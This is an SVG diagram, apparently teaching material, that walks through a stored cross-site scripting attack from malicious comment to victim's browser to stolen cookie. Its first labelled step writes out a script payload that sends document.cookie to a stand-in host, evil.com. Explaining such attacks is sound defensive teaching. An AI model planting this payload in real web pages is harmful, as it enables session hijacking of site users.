<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1280 720" font-family="Arial, sans-serif" style="background:var(--bg)">
  <metadata>
    <type>regular</type>
  </metadata>
  <text x="40" y="40" font-size="22.185068306804" fill="var(--text-muted)" font-family="Arial, sans-serif">1. Attacker posts malicious comment:</text>
  <text x="74.615402218936" y="74.229517871543" font-size="20.33627601062" fill="var(--danger-accent)" font-family="Arial, sans-serif">&lt;script&gt;fetch('https://evil.com/steal?c='+document.cookie)&lt;/script&gt;</text>
  <rect x="40" y="106.55723192686" width="276.923086982249" height="85.573794678857" rx="8.784947950503" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="178.461478106505" y="159.803148615927" text-anchor="middle" font-size="22.185068306804" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Attacker</text>
  <rect x="478.461543491125" y="106.55723192686" width="300.00006538462" height="85.573794678857" rx="8.784947950503" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="628.461445414195" y="159.803148615927" text-anchor="middle" font-size="22.185068306804" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Web Server</text>
  <rect x="939.99993461538" y="106.55723192686" width="300.00006538462" height="85.573794678857" rx="8.784947950503" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="1090.00009807693" y="159.803148615927" text-anchor="middle" font-size="22.185068306804" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Database</text>
  <line x1="316.92295621301" y1="148.393473259885" x2="478.461543491125" y2="148.393473259885" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <line x1="778.461478106505" y1="148.393473259885" x2="939.99993461538" y2="148.393473259885" stroke="var(--danger-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <text x="40" y="258.68842246705" font-size="22.185068306804" fill="var(--text-muted)" font-family="Arial, sans-serif">2. Victim views the page with the comment</text>
  <line x1="1090.00009807693" y1="192.13119054019" x2="1090.00009807693" y2="306.229419510859" stroke="var(--primary-border)" stroke-width="1.8823"/>
  <rect x="40" y="306.229419510859" width="276.923086982249" height="104.59019349638" rx="8.784947950503" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="178.461478106505" y="349.967136791164" text-anchor="middle" font-size="22.185068306804" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Victim</text>
  <text x="178.461478106505" y="382.295014780954" text-anchor="middle" font-size="20.33627601062" fill="var(--text-muted)" font-family="Arial, sans-serif">Browser</text>
  <rect x="478.461543491125" y="306.229419510859" width="300.00006538462" height="104.59019349638" rx="8.784947950503" fill="url(#grad-warn)" stroke="var(--warn-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="628.461445414195" y="349.967136791164" text-anchor="middle" font-size="22.185068306804" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Web Server</text>
  <text x="628.461445414195" y="382.295014780954" text-anchor="middle" font-size="20.33627601062" fill="var(--text-muted)" font-family="Arial, sans-serif">serves page</text>
  <rect x="939.99993461538" y="306.229419510859" width="300.00006538462" height="104.59019349638" rx="8.784947950503" fill="url(#grad-ok)" stroke="var(--ok-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="1090.00009807693" y="349.967136791164" text-anchor="middle" font-size="22.185068306804" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">Database</text>
  <text x="1090.00009807693" y="382.295014780954" text-anchor="middle" font-size="20.33627601062" fill="var(--text-muted)" font-family="Arial, sans-serif">returns data</text>
  <line x1="478.461543491125" y1="357.573696318173" x2="316.92295621301" y2="357.573696318173" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <line x1="939.99993461538" y1="357.573696318173" x2="778.461478106505" y2="357.573696318173" stroke="var(--primary-border)" stroke-width="2" marker-end="url(#arrow)"/>
  <text x="40" y="477.377008868572" font-size="22.185068306804" fill="var(--text-muted)" font-family="Arial, sans-serif">3. Browser executes the script</text>
  <line x1="178.461478106505" y1="410.819613007239" x2="178.461478106505" y2="515.40980650362" stroke="var(--danger-border)" stroke-width="1.8823"/>
  <rect x="40" y="515.40980650362" width="415.384695857993" height="104.59019349638" rx="8.784947950503" fill="url(#grad-danger)" stroke="var(--danger-border)" stroke-width="2" filter="url(#shadow)"/>
  <text x="247.692282544377" y="559.147687718397" text-anchor="middle" font-size="22.185068306804" font-weight="bold" fill="var(--text)" font-family="Arial, sans-serif">evil.com</text>
  <text x="247.692282544377" y="597.180485353444" text-anchor="middle" font-size="20.33627601062" fill="var(--text-muted)" font-family="Arial, sans-serif">receives session cookie</text>
  <text x="524.615369526626" y="572.459166890663" font-size="22.185068306804" fill="var(--danger-accent)" font-family="Arial, sans-serif">4. Cookie sent to attacker</text>
  <defs>
    <style id="palette-vars">
      :root, svg {
        --bg: #ffffff;
        --surface: #c4cdd6;
        --border: #6b7280;
        --text: #212121;
        --text-muted: #555555;
        --text-faint: #888888;
        --code-bg: #1a1a2e;
        --shadow: #00000044;
        --black: #000000;
        --primary-fill: #5a7a9c;
        --primary-border: #3d5a7d;
        --primary-text: #ffffff;
        --primary-accent: #243b59;
        --ok-fill: #7a9a6a;
        --ok-border: #5a7a4d;
        --ok-text: #ffffff;
        --ok-accent: #385030;
        --warn-fill: #c8924a;
        --warn-border: #9c6e2e;
        --warn-text: #ffffff;
        --warn-accent: #5a3f12;
        --danger-fill: #a86058;
        --danger-border: #7d3f38;
        --danger-text: #ffffff;
        --danger-accent: #4a1f1a;
        --info-fill: #7c6a8e;
        --info-border: #574a68;
        --info-text: #ffffff;
        --info-accent: #2f253b;
      }
    </style>
    <!-- Gradients -->
    <linearGradient id="grad-primary" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#7493b3"/>
      <stop offset="100%" stop-color="#3d5a7d"/>
    </linearGradient>

    <linearGradient id="grad-surface" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#ffffff"/>
      <stop offset="100%" stop-color="#c4cdd6"/>
    </linearGradient>

    <linearGradient id="grad-ok" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#94b384"/>
      <stop offset="100%" stop-color="#5a7a4d"/>
    </linearGradient>

    <linearGradient id="grad-warn" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#dba868"/>
      <stop offset="100%" stop-color="#9c6e2e"/>
    </linearGradient>

    <linearGradient id="grad-danger" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#bd7d75"/>
      <stop offset="100%" stop-color="#7d3f38"/>
    </linearGradient>

    <linearGradient id="grad-info" x1="0" y1="0" x2="0" y2="1">
      <stop offset="0%" stop-color="#9384a5"/>
      <stop offset="100%" stop-color="#574a68"/>
    </linearGradient>

    <!-- Drop shadow -->
    <filter id="shadow" x="-4%" y="-8%" width="108%" height="124%">
      <feDropShadow dx="0" dy="4" stdDeviation="8" flood-color="#00000044"/>
    </filter>

    <!-- Arrow markers -->
    <marker id="arrow" markerWidth="14" markerHeight="14" refX="11" refY="6" orient="auto" markerUnits="userSpaceOnUse">
      <path d="M0,0 L12,6 L0,12 L3,6 Z" fill="#243b59"/>
    </marker>
    <marker id="arrow-primary" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#3d5a7d"/>
    </marker>
    <marker id="arrow-ok" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#5a7a4d"/>
    </marker>
    <marker id="arrow-warn" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#9c6e2e"/>
    </marker>
    <marker id="arrow-danger" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#7d3f38"/>
    </marker>
    <marker id="arrow-info" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#574a68"/>
    </marker>
    <marker id="arrow-white" markerWidth="10" markerHeight="10" refX="9" refY="5" orient="auto">
      <path d="M1,2 L9,5 L1,8 Z" fill="#ffffff"/>
    </marker>
  </defs>
</svg>
